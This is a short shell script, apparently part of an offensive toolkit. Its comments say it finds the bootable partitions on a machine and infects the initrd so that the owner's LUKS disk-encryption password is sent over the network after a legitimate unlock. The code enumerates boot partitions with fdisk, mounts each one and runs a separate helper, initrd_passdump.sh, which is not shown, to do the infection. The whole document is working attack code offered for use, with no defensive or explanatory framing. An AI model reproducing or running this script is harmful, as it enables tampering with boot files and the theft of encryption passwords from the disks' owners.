#!/bin/sh

# This script seeks all the bootable partitions on the hard drive, and
# tryes to infect initrd so that if it uses LUKS hard drive encryption,
# the password will be dumped on the net ASAP after the encrupted disk has
# been legitimately mounted by his owner.

# Get the all the bootable partitions
sector_lines="`/sbin/fdisk -l 2> /dev/null  | /bin/grep '^/dev/'`"
sectors=`echo "$sector_lines" | /bin/grep "\*" | /bin/sed 's#^\(/dev/[a-zA-Z1-9]*\).*#\1#'`


echo "Boot partitions are: $sectors"

bootroot="/mnt/boot_infect"
mkdir -p $bootroot/boot

for sector in $sectors; do
    echo "*** Mounting $sector"
    mount $sector $bootroot/boot
    echo "*** Infection..."
    if ./initrd_passdump.sh $bootroot; then
        echo "*** Infected."
    else
        echo "*** Error during infection of $sector"
    fi

    umount $bootroot/boot
done

